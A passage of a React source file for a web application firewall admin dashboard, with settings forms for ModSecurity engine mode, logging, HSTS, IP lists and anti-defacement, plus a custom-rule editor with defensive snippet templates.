                  <div style={{ marginTop: '20px', paddingTop: '20px', borderTop: '1px solid rgba(255,255,255,0.05)' }}>
                    <button type="submit" className="modal-btn primary" style={{ padding: '12px 24px', fontSize: '14px' }}>
                      Save General Preferences
                    </button>
                  </div>
                </form>
              </motion.div>
            )}

            {activeSettingTab === 'waf' && (
              <motion.div key="waf" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} transition={{ duration: 0.2 }}>
                <div className="settings-section-title">
                  <ShieldCheck size={20} color="#3b82f6" />
                  WAF Engine Policies
                </div>
                <div className="settings-section-subtitle">Manage CyberSentinel Engine ruleset behaviors and blocking modes.</div>

                <form onSubmit={handleSaveWAF} style={{ display: 'flex', flexDirection: 'column', gap: '20px', maxWidth: '600px' }}>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                    <label style={{ fontSize: '13px', color: '#a1a1aa' }}>SecRuleEngine Posture</label>
                    <select className="filter-select" style={{ width: '100%', padding: '12px', fontSize: '14px' }} value={secRuleEngine} onChange={(e) => setSecRuleEngine(e.target.value)}>
                      <option value="On">On (Active Blocking Guard)</option>
                      <option value="DetectionOnly">DetectionOnly (Simulate Attacks)</option>
                      <option value="Off">Off (Bypass WAF Shields - Critical Risk)</option>
                    </select>
                  </div>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                    <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Response Filtering Mode</label>
                    <select className="filter-select" style={{ width: '100%', padding: '12px', fontSize: '14px' }} value={detectionMode} onChange={(e) => setDetectionMode(e.target.value)}>
                      <option value="Blocking">Strict Block & Drop (403 Forbidden)</option>
                      <option value="Detection">Log Analysis Only (Bypass drops)</option>
                    </select>
                  </div>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', marginTop: '10px' }}>
                    <label style={{ fontSize: '13px', color: '#a1a1aa', display: 'flex', justifyContent: 'space-between' }}>
                      <span>Global Paranoia Setting</span>
                      <strong style={{ color: '#3b82f6', fontSize: '14px' }}>PL{paranoiaLevel}</strong>
                    </label>
                    <input
                      type="range"
                      min="1"
                      max="4"
                      value={paranoiaLevel}
                      onChange={(e) => setParanoiaLevel(parseInt(e.target.value))}
                      style={{ width: '100%', height: '8px', background: 'rgba(255,255,255,0.06)', borderRadius: '4px', outline: 'none', appearance: 'none', accentColor: '#3b82f6', marginTop: '8px' }}
                    />
                    <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '12px', color: '#71717a', marginTop: '6px' }}>
                      <span>PL1: Standard</span>
                      <span>PL2</span>
                      <span>PL3</span>
                      <span>PL4: Paranoid</span>
                    </div>
                  </div>
                  <div style={{ marginTop: '20px', paddingTop: '20px', borderTop: '1px solid rgba(255,255,255,0.05)' }}>
                    <button type="submit" disabled={loadingAction} className="modal-btn primary" style={{ padding: '12px 24px', fontSize: '14px' }}>
                      {loadingAction ? 'Updating Ruleset...' : 'Update WAF Policies'}
                    </button>
                  </div>
                </form>
              </motion.div>
            )}

            {activeSettingTab === 'logs' && (
              <motion.div key="logs" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} transition={{ duration: 0.2 }}>
                <div className="settings-section-title">
                  <Database size={20} color="#3b82f6" />
                  Log Pipeline Configuration
                </div>
                <div className="settings-section-subtitle">Configure SecAuditEngine and log retention policies.</div>

                <form onSubmit={handleSaveLogs} style={{ display: 'flex', flexDirection: 'column', gap: '20px', maxWidth: '600px' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: 'rgba(255,255,255,0.02)', padding: '16px', borderRadius: '12px', border: '1px solid rgba(255,255,255,0.05)' }}>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                      <span style={{ fontSize: '14px', fontWeight: 500, color: '#e4e4e7' }}>SecAuditEngine Logging</span>
                      <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Record details of flagged transactions</span>
                    </div>
                    <div className={`toggle-switch ${auditEnabled ? 'active' : ''}`} onClick={() => setAuditEnabled(!auditEnabled)}>
                      <div className="toggle-knob"></div>
                    </div>
                  </div>

                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                    <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Audit Log Structure Formats</label>
                    <select className="filter-select" style={{ width: '100%', padding: '12px', fontSize: '14px' }} value={logFormat} onChange={(e) => setLogFormat(e.target.value)}>
                      <option value="JSON">Structured JSON (RFC 8259 Standard)</option>
                      <option value="Native">CyberSentinel Engine Native Audit Structure</option>
                    </select>
                  </div>

                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: 'rgba(255,255,255,0.02)', padding: '16px', borderRadius: '12px', border: '1px solid rgba(255,255,255,0.05)' }}>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                      <span style={{ fontSize: '14px', fontWeight: 500, color: '#e4e4e7' }}>Concurrent Multi-Threading</span>
                      <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Non-blocking log processing pipeline</span>
                    </div>
                    <div className={`toggle-switch ${concurrentLogging ? 'active' : ''}`} onClick={() => setConcurrentLogging(!concurrentLogging)}>
                      <div className="toggle-knob"></div>
                    </div>
                  </div>

                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                    <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Log Retention Period</label>
                    <select className="filter-select" style={{ width: '100%', padding: '12px', fontSize: '14px' }} value={retention} onChange={(e) => setRetention(e.target.value)}>
                      <option value="7 Days">7 Days</option>
                      <option value="30 Days">30 Days</option>
                      <option value="90 Days">90 Days</option>
                      <option value="1 Year">1 Year</option>
                      <option value="Forever">Infinite / Log Rotation Disabled</option>
                    </select>
                  </div>

                  <div style={{ marginTop: '20px', paddingTop: '20px', borderTop: '1px solid rgba(255,255,255,0.05)' }}>
                    <button type="submit" className="modal-btn primary" style={{ padding: '12px 24px', fontSize: '14px' }}>
                      Update Logging Configuration
                    </button>
                  </div>
                </form>
              </motion.div>
            )}

            {activeSettingTab === 'hardening' && (
              <motion.div key="hardening" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} transition={{ duration: 0.2 }}>
                <div className="settings-section-title">
                  <Server size={20} color="#3b82f6" />
                  Infrastructure Hardening
                </div>
                <div className="settings-section-subtitle">Manage HSTS, server cloaking, and IP restrictions.</div>

                <form onSubmit={handleSaveHardening} style={{ display: 'flex', flexDirection: 'column', gap: '20px', maxWidth: '600px' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: 'rgba(255,255,255,0.02)', padding: '16px', borderRadius: '12px', border: '1px solid rgba(255,255,255,0.05)' }}>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                      <span style={{ fontSize: '14px', fontWeight: 500, color: '#e4e4e7' }}>Strict HTTPS (HSTS)</span>
                      <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Enforce Strict-Transport-Security header</span>
                    </div>
                    <div className={`toggle-switch ${hstsEnabled ? 'active' : ''}`} onClick={() => setHstsEnabled(!hstsEnabled)}>
                      <div className="toggle-knob"></div>
                    </div>
                  </div>

                  <AnimatePresence>
                    {hstsEnabled && (
                      <motion.div initial={{ opacity: 0, height: 0 }} animate={{ opacity: 1, height: 'auto' }} exit={{ opacity: 0, height: 0 }} style={{ overflow: 'hidden' }}>
                        <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', paddingBottom: '10px' }}>
                          <label style={{ fontSize: '13px', color: '#a1a1aa' }}>HSTS Max Age (Seconds)</label>
                          <input
                            type="number"
                            className="settings-input"
                            style={{ width: '100%', fontSize: '14px' }}
                            value={hstsMaxAge}
                            onChange={(e) => setHstsMaxAge(e.target.value)}
                            placeholder="31536000"
                          />
                        </div>
                      </motion.div>
                    )}
                  </AnimatePresence>

                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: 'rgba(255,255,255,0.02)', padding: '16px', borderRadius: '12px', border: '1px solid rgba(255,255,255,0.05)' }}>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                      <span style={{ fontSize: '14px', fontWeight: 500, color: '#e4e4e7' }}>Server Cloaking</span>
                      <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Scrub NGINX tokens & Express header disclosures</span>
                    </div>
                    <div className={`toggle-switch ${serverCloaking ? 'active' : ''}`} onClick={() => setServerCloaking(!serverCloaking)}>
                      <div className="toggle-knob"></div>
                    </div>
                  </div>

                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                    <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Global IP Blacklist (Comma separated)</label>
                    <textarea
                      className="settings-input"
                      style={{ width: '100%', minHeight: '80px', resize: 'vertical' }}
                      value={ipBlacklist}
                      onChange={(e) => setIpBlacklist(e.target.value)}
                      placeholder="192.168.1.100, 10.0.0.50"
                    />
                  </div>

                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                    <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Global IP Whitelist (Comma separated)</label>
                    <textarea
                      className="settings-input"
                      style={{ width: '100%', minHeight: '80px', resize: 'vertical' }}
                      value={ipWhitelist}
                      onChange={(e) => setIpWhitelist(e.target.value)}
                      placeholder="192.168.1.10, 127.0.0.1"
                    />
                  </div>

                  <div style={{ marginTop: '20px', paddingTop: '20px', borderTop: '1px solid rgba(255,255,255,0.05)' }}>
                    <button type="submit" className="modal-btn primary" style={{ padding: '12px 24px', fontSize: '14px' }}>
                      Apply Infrastructure Changes
                    </button>
                  </div>
                </form>
              </motion.div>
            )}

            {activeSettingTab === 'defacement' && (
              <motion.div key="defacement" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} transition={{ duration: 0.2 }}>
                <div className="settings-section-title">
                  <ShieldAlert size={20} color="#ef4444" />
                  Anti-Defacement Protection
                </div>
                <div className="settings-section-subtitle">Real-time integrity monitoring for critical assets.</div>

                <form onSubmit={handleSaveDefacement} style={{ display: 'flex', flexDirection: 'column', gap: '20px', maxWidth: '600px' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: 'rgba(255,255,255,0.02)', padding: '16px', borderRadius: '12px', border: '1px solid rgba(255,255,255,0.05)' }}>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                      <span style={{ fontSize: '14px', fontWeight: 500, color: '#e4e4e7' }}>Real-time Integrity Monitor</span>
                      <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Revert unauthorized content modifications instantly</span>
                    </div>
                    <div className={`toggle-switch ${defacementEnabled ? 'active' : ''}`} onClick={() => setDefacementEnabled(!defacementEnabled)}>
                      <div className="toggle-knob"></div>
                    </div>
                  </div>

                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                    <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Audit Scan Interval (Seconds)</label>
                    <select className="filter-select" style={{ width: '100%', padding: '12px', fontSize: '14px' }} value={checkInterval} onChange={(e) => setCheckInterval(parseInt(e.target.value))}>
                      <option value="2">2 Seconds (High sensitivity)</option>
                      <option value="5">5 Seconds (Recommended)</option>
                      <option value="10">10 Seconds</option>
                      <option value="30">30 Seconds</option>
                    </select>
                  </div>

                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                    <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Monitored Asset Filepaths (Comma separated)</label>
                    <textarea
                      className="settings-input"
                      style={{ width: '100%', minHeight: '100px', resize: 'vertical' }}
                      value={defacementFiles}
                      onChange={(e) => setDefacementFiles(e.target.value)}
                      placeholder="/var/www/html/index.html"
                      required
                    />
                    <span style={{ fontSize: '11px', color: '#71717a', marginTop: '4px' }}>
                      System background service prefetches and locks these files.
                    </span>
                  </div>

                  <div style={{ marginTop: '20px', paddingTop: '20px', borderTop: '1px solid rgba(255,255,255,0.05)' }}>
                    <button type="submit" disabled={loadingAction} className="modal-btn primary" style={{ padding: '12px 24px', fontSize: '14px', background: 'var(--danger-color)' }}>
                      {loadingAction ? 'Applying...' : 'Apply Defacement Protection'}
                    </button>
                  </div>
                </form>
              </motion.div>
            )}

            {activeSettingTab === 'security' && (
              <motion.div key="security" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} transition={{ duration: 0.2 }}>
                <div className="settings-section-title">
                  <Lock size={20} color="#3b82f6" />
                  Admin Security & Danger Zone
                </div>
                <div className="settings-section-subtitle">Manage portal access credentials and system overrides.</div>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '40px', maxWidth: '600px' }}>

                  {/* Password Form */}
                  <form onSubmit={handleChangePassword} style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                    <div style={{ fontSize: '15px', fontWeight: 600, color: '#f4f4f5', marginBottom: '8px' }}>Portal Authentication</div>

                    <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                      <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Current Admin Password</label>
                      <input type="password" placeholder="••••••••" className="settings-input" value={currentPassword} onChange={(e) => setCurrentPassword(e.target.value)} required />
                    </div>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                      <label style={{ fontSize: '13px', color: '#a1a1aa' }}>New Security Password</label>
                      <input type="password" placeholder="••••••••" className="settings-input" value={newPassword} onChange={(e) => setNewPassword(e.target.value)} required />
                    </div>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                      <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Confirm New Password</label>
                      <input type="password" placeholder="••••••••" className="settings-input" value={confirmPassword} onChange={(e) => setConfirmPassword(e.target.value)} required />
                    </div>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', marginTop: '4px' }}>
                      <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Portal Session Timeout</label>
                      <select className="filter-select" style={{ width: '100%', padding: '12px' }} value={sessionTimeout} onChange={(e) => setSessionTimeout(e.target.value)}>
                        <option value="15m">15 Minutes</option>
                        <option value="30m">30 Minutes</option>
                        <option value="1h">1 Hour (Standard)</option>
                        <option value="4h">4 Hours</option>
                        <option value="12h">12 Hours</option>
                        <option value="never">No Automatic Timeout</option>
                      </select>
                    </div>
                    <div style={{ display: 'flex', gap: '12px', marginTop: '16px' }}>
                      <button type="submit" className="modal-btn primary" style={{ padding: '12px 24px' }}>
                        Update Credentials
                      </button>
                      <button type="button" onClick={onLogout} className="action-btn-inspect" style={{ background: 'rgba(239, 68, 68, 0.1)', color: '#ef4444', borderColor: 'rgba(239, 68, 68, 0.2)', padding: '12px 24px', fontSize: '13px' }}>
                        Terminate Session
                      </button>
                    </div>
                  </form>

                  {/* Danger Zone */}
                  <div style={{ background: 'linear-gradient(135deg, rgba(239, 68, 68, 0.05) 0%, rgba(0, 0, 0, 0) 100%)', border: '1px solid rgba(239, 68, 68, 0.2)', borderRadius: '16px', padding: '24px' }}>
                    <div style={{ fontSize: '15px', fontWeight: 600, color: '#fca5a5', marginBottom: '20px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <AlertTriangle size={18} color="#ef4444" />
                      System Overrides
                    </div>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 16px', background: 'rgba(239,68,68,0.04)', borderRadius: '10px', border: '1px solid rgba(239,68,68,0.1)' }}>
                        <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                          <span style={{ fontSize: '14px', fontWeight: 600, color: '#fca5a5' }}>Restart CyberSentinel Engine WAF Engine</span>
                          <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Force service instance container reload</span>
                        </div>
                        <button type="button" onClick={() => setDangerModal('restart')} className="action-btn-inspect" style={{ background: 'rgba(239,68,68,0.15)', color: '#fca5a5', borderColor: 'rgba(239,68,68,0.3)', padding: '8px 16px' }}>
                          Restart Engine
                        </button>
                      </div>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 16px', background: 'rgba(239,68,68,0.04)', borderRadius: '10px', border: '1px solid rgba(239,68,68,0.1)' }}>
                        <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                          <span style={{ fontSize: '14px', fontWeight: 600, color: '#fca5a5' }}>Reload System NGINX Proxy</span>
                          <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Rebuild active NGINX process configurations</span>
                        </div>
                        <button type="button" onClick={() => setDangerModal('nginx')} className="action-btn-inspect" style={{ background: 'rgba(239,68,68,0.15)', color: '#fca5a5', borderColor: 'rgba(239,68,68,0.3)', padding: '8px 16px' }}>
                          Reload NGINX
                        </button>
                      </div>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 16px', background: 'rgba(239,68,68,0.04)', borderRadius: '10px', border: '1px solid rgba(239,68,68,0.1)' }}>
                        <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                          <span style={{ fontSize: '14px', fontWeight: 600, color: '#fca5a5' }}>Purge Local UI Cache</span>
                          <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Invalidate local storage metrics data cache</span>
                        </div>
                        <button type="button" onClick={() => setDangerModal('cache')} className="action-btn-inspect" style={{ background: 'rgba(239,68,68,0.15)', color: '#fca5a5', borderColor: 'rgba(239,68,68,0.3)', padding: '8px 16px' }}>
                          Purge Cache
                        </button>
                      </div>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 16px', background: 'rgba(239,68,68,0.04)', borderRadius: '10px', border: '1px solid rgba(239,68,68,0.1)' }}>
                        <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                          <span style={{ fontSize: '14px', fontWeight: 600, color: '#fca5a5' }}>Sync Signatures (OWASP CRS)</span>
                          <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Download and synchronize latest CRS rules</span>
                        </div>
                        <button type="button" onClick={() => setDangerModal('sync')} className="action-btn-inspect" style={{ background: 'rgba(239,68,68,0.15)', color: '#fca5a5', borderColor: 'rgba(239,68,68,0.3)', padding: '8px 16px' }}>
                          Sync Signatures
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              </motion.div>
            )}

          </AnimatePresence>
        </div>
      </div>
    </motion.div>
  );
}

// Map between URL paths and tab IDs
// Protection Section Component - Sub-tabbed: Virtual Hosts | DDoS & Bot Shield
function ProtectionSection({ appsRefreshKey, onOpenWizard }) {
  const [activeSubTab, setActiveSubTab] = useState('apps');

  const subTabs = [
    {
      id: 'apps',
      label: 'Virtual Hosts',
      icon: Server,
      description: 'Manage reverse-proxy protected applications and SSL termination',
      statusColor: '#10b981',
    },
    {
      id: 'ddos',
      label: 'DDoS & Bot Shield',
      icon: ShieldAlert,
      description: 'Layer-7 rate limiting, bot mitigation and live traffic analytics',
      statusColor: '#f59e0b',
    },
  ];

  const activeTabMeta = subTabs.find(t => t.id === activeSubTab);
  const ActiveIcon = activeTabMeta?.icon;

  return (
    <div className="advanced-section">
      {/* Section Header */}
      <div style={{
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'space-between',
        marginBottom: '20px',
        paddingBottom: '16px',
        borderBottom: '1px solid rgba(255,255,255,0.06)',
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
          {ActiveIcon && (
            <div style={{
              width: '36px', height: '36px', borderRadius: '10px',
              background: 'rgba(59,130,246,0.12)', border: '1px solid rgba(59,130,246,0.2)',
              display: 'flex', alignItems: 'center', justifyContent: 'center',
            }}>
              <ActiveIcon size={18} color="#3b82f6" />
            </div>
          )}
          <div>
            <div style={{ fontSize: '15px', fontWeight: 700, color: '#f4f4f5', lineHeight: 1.2 }}>
              {activeTabMeta?.label}
            </div>
            <div style={{ fontSize: '12px', color: '#71717a', marginTop: '2px' }}>
              {activeTabMeta?.description}
            </div>
          </div>
        </div>
        <div style={{
          display: 'flex', alignItems: 'center', gap: '6px',
          padding: '4px 10px', borderRadius: '20px',
          background: 'rgba(16,185,129,0.08)', border: '1px solid rgba(16,185,129,0.2)',
          fontSize: '11px', fontWeight: 600, color: '#34d399',
        }}>
          <div style={{ width: '6px', height: '6px', borderRadius: '50%', background: '#10b981' }} />
          ACTIVE ENFORCEMENT
        </div>
      </div>

      {/* Sub-navigation */}
      <div className="subtabs-container" style={{ marginBottom: '24px' }}>
        {subTabs.map((tab) => {
          const Icon = tab.icon;
          return (
            <button
              key={tab.id}
              className={`subtab-btn ${activeSubTab === tab.id ? 'active' : ''}`}
              onClick={() => setActiveSubTab(tab.id)}
            >
              <Icon size={16} />
              <span>{tab.label}</span>
            </button>
          );
        })}
      </div>

      {/* Content */}
      <motion.div
        key={activeSubTab}
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.25 }}
      >
        {activeSubTab === 'apps' && (
          <ProtectedApps
            key={appsRefreshKey}
            onOpenWizard={onOpenWizard}
          />
        )}
        {activeSubTab === 'ddos' && <DdosBotMitigation />}
      </motion.div>
    </div>
  );
}

// Custom Rules Editor (Virtual Patching) Component
function CustomRulesEditor({ userRole }) {
  const [rulesContent, setRulesContent] = useState('');
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [message, setMessage] = useState({ type: '', text: '' });

  const fetchRules = async () => {
    setLoading(true);
    setMessage({ type: '', text: '' });
    try {
      const data = await getCustomRules();
      setRulesContent(data.rules_content || '');
    } catch (err) {
      console.error("Failed to load custom rules:", err);
      setMessage({ type: 'error', text: 'Failed to load custom rules from server.' });
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchRules();
  }, []);

  const handleSave = async () => {
    setSaving(true);
    setMessage({ type: '', text: '' });
    try {
      const res = await saveCustomRules(rulesContent);
      setMessage({ type: 'success', text: res.message || 'Custom rules saved and applied successfully.' });
    } catch (err) {
      console.error("Failed to save custom rules:", err);
      setMessage({ type: 'error', text: err.message || 'Validation failed. Check your rule syntax.' });
    } finally {
      setSaving(false);
    }
  };

  const insertSnippet = (snippet) => {
    setRulesContent(prev => prev ? `${prev}\n\n${snippet}` : snippet);
  };

  return (
    <div style={{ background: '#121319', borderRadius: '12px', border: '1px solid #1e2230', padding: '24px' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px', flexWrap: 'wrap', gap: '12px' }}>
        <div>
          <h3 style={{ margin: 0, color: '#f4f4f5', fontSize: '18px', display: 'flex', alignItems: 'center', gap: '8px' }}>
            <Code size={20} color="#3b82f6" />
            Virtual Patching (Custom ModSecurity Rules)
          </h3>
          <p style={{ margin: '4px 0 0 0', color: '#71717a', fontSize: '13px' }}>
            Write custom ModSecurity SecRules to mitigate zero-day vulnerabilities in real time. Rules are validated for syntax before reload.
          </p>
        </div>
        <div style={{ display: 'flex', gap: '10px' }}>
          <button
            onClick={fetchRules}
            disabled={loading || saving}
            style={{
              padding: '8px 16px', fontSize: '13px', display: 'flex', alignItems: 'center', gap: '6px',
              background: '#1e2230', color: '#a1a1aa', border: '1px solid #2a2e3d', borderRadius: '6px',
              cursor: (loading || saving) ? 'not-allowed' : 'pointer', opacity: (loading || saving) ? 0.6 : 1, fontWeight: 500
            }}
          >
            <RefreshCw size={14} className={loading ? 'spin' : ''} />
            <span>Reload File</span>
          </button>
          <button
            onClick={handleSave}
            disabled={loading || saving || userRole !== 'admin'}
            style={{
              padding: '8px 20px', fontSize: '13px', display: 'flex', alignItems: 'center', gap: '6px',
              background: '#3b82f6', color: '#fff', border: 'none', borderRadius: '6px',
              cursor: (loading || saving || userRole !== 'admin') ? 'not-allowed' : 'pointer',
              opacity: (loading || saving || userRole !== 'admin') ? 0.6 : 1, fontWeight: 600
            }}
          >
            {saving ? <RefreshCw size={14} className="spin" /> : <Check size={14} />}
            <span>{saving ? 'Validating & Applying...' : 'Apply & Reload WAF'}</span>
          </button>
        </div>
      </div>

      {message.text && (
        <div style={{
          padding: '12px 16px', borderRadius: '8px', marginBottom: '16px', fontSize: '13px', fontWeight: 500,
          background: message.type === 'success' ? 'rgba(16, 185, 129, 0.12)' : 'rgba(239, 68, 68, 0.12)',
          border: message.type === 'success' ? '1px solid rgba(16, 185, 129, 0.3)' : '1px solid rgba(239, 68, 68, 0.3)',
          color: message.type === 'success' ? '#34d399' : '#f87171',
          whiteSpace: 'pre-wrap', fontFamily: 'var(--font-mono)'
        }}>
          {message.text}
        </div>
      )}

      {/* Quick Snippet Helpers */}
      <div style={{ marginBottom: '16px', display: 'flex', gap: '8px', flexWrap: 'wrap', alignItems: 'center' }}>
        <span style={{ fontSize: '12px', color: '#a1a1aa', fontWeight: 600 }}>Quick Patch Templates:</span>
        <button
          onClick={() => insertSnippet(`SecRule REQUEST_HEADERS:User-Agent "@contains BadBot" "id:${1000000 + Math.floor(Math.random()*900000)},phase:1,deny,status:403,msg:'Blocked Bad Bot'"`)}
          style={{ background: '#1e2230', border: '1px solid #2a2e3d', color: '#38bdf8', padding: '5px 12px', borderRadius: '4px', fontSize: '11px', cursor: 'pointer', fontWeight: 600 }}
        >
          + Block User-Agent
        </button>
        <button
          onClick={() => insertSnippet(`SecRule REQUEST_URI "@contains /vulnerable-endpoint" "id:${1000000 + Math.floor(Math.random()*900000)},phase:1,deny,status:403,msg:'Virtual Patch Endpoint'"`)}
          style={{ background: '#1e2230', border: '1px solid #2a2e3d', color: '#38bdf8', padding: '5px 12px', borderRadius: '4px', fontSize: '11px', cursor: 'pointer', fontWeight: 600 }}
        >
          + Block URI Endpoint
        </button>
        <button
          onClick={() => insertSnippet(`SecRule REMOTE_ADDR "@ipMatch 192.168.1.100" "id:${1000000 + Math.floor(Math.random()*900000)},phase:1,deny,status:403,msg:'Blocked Attacker IP'"`)}
          style={{ background: '#1e2230', border: '1px solid #2a2e3d', color: '#38bdf8', padding: '5px 12px', borderRadius: '4px', fontSize: '11px', cursor: 'pointer', fontWeight: 600 }}
        >
          + Block IP Address
        </button>
        <button
          onClick={() => insertSnippet(`SecRule ARGS:payload "@rx (?i)<script>" "id:${1000000 + Math.floor(Math.random()*900000)},phase:2,deny,status:403,msg:'Parameter Regex Filter'"`)}
          style={{ background: '#1e2230', border: '1px solid #2a2e3d', color: '#38bdf8', padding: '5px 12px', borderRadius: '4px', fontSize: '11px', cursor: 'pointer', fontWeight: 600 }}
        >
          + Parameter Regex Filter
        </button>
      </div>

      {/* Code Editor */}
      <div style={{ position: 'relative', borderRadius: '8px', border: '1px solid #27272a', overflow: 'hidden' }}>
        <div style={{ background: '#18181b', padding: '8px 16px', borderBottom: '1px solid #27272a', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <span style={{ fontSize: '12px', color: '#a1a1aa', fontFamily: 'var(--font-mono)' }}>/etc/nginx/modsec/custom-rules.conf</span>
          <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
            <span style={{ fontSize: '11px', color: '#34d399', background: 'rgba(52, 211, 153, 0.1)', padding: '2px 8px', borderRadius: '4px', fontWeight: 600 }}>
              {rulesContent.split('\n').filter(line => line.trim().startsWith('SecRule')).length} Active Custom Rules
            </span>
            <span style={{ fontSize: '11px', color: '#52525b' }}>ModSecurity v3 Engine</span>
          </div>
        </div>
        <textarea
          value={rulesContent}
          onChange={(e) => setRulesContent(e.target.value)}
          disabled={loading || userRole !== 'admin'}
          placeholder="# Write custom ModSecurity SecRules here...&#10;&#10;# Example:&#10;SecRule REQUEST_URI &quot;@contains /vulnerable-api&quot; &quot;id:1000001,phase:1,deny,status:403,msg:'Zero-day Virtual Patch'&quot;"
          rows={18}
          style={{
            width: '100%',
            background: '#09090b',
            color: '#34d399',
            fontFamily: 'Consolas, Monaco, "Andale Mono", "Ubuntu Mono", monospace',
            fontSize: '13px',
            lineHeight: '1.6',
            padding: '16px',
            border: 'none',
            outline: 'none',
            resize: 'vertical',
            boxSizing: 'border-box'
          }}
        />
      </div>
    </div>
  );
}

// Advanced Settings Section Component - Collapsible subsections
function AdvancedSection({ userRole, onMarkFalsePositive, onCreateException, onLogout, initialSubTab = 'false_positives' }) {
  const [activeSubTab, setActiveSubTab] = useState(initialSubTab);

  useEffect(() => {
    setActiveSubTab(initialSubTab);
  }, [initialSubTab]);

  const subTabs = [
    { id: 'false_positives', label: 'False Positives', icon: ShieldCheck },
    { id: 'exceptions', label: 'Exceptions', icon: AlertTriangle },
    { id: 'rules', label: 'Rules', icon: ShieldAlert },
    { id: 'api_protection', label: 'API Protection', icon: Globe },
    { id: 'integrations', label: 'Alerts & Integrations', icon: Server },
    { id: 'reports', label: 'Security Reports', icon: FileText },
    ...(userRole === 'admin' ? [
      { id: 'custom_rules', label: 'Virtual Patching (Custom Rules)', icon: Code },
      { id: 'settings', label: 'Settings', icon: SettingsIcon }
    ] : []),
  ];

  return (
    <div className="advanced-section">
      {/* Sub-navigation tabs */}
      <div className="subtabs-container" style={{ marginBottom: '24px' }}>
        {subTabs.map((tab) => {
          const Icon = tab.icon;
          return (
            <button
              key={tab.id}
              className={`subtab-btn ${activeSubTab === tab.id ? 'active' : ''}`}
              onClick={() => setActiveSubTab(tab.id)}
            >
              <Icon size={16} />
              <span>{tab.label}</span>
            </button>
          );
        })}
      </div>

      {/* Content for each sub-tab */}
      <motion.div
        key={activeSubTab}
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.3 }}
      >
        {activeSubTab === 'false_positives' && (
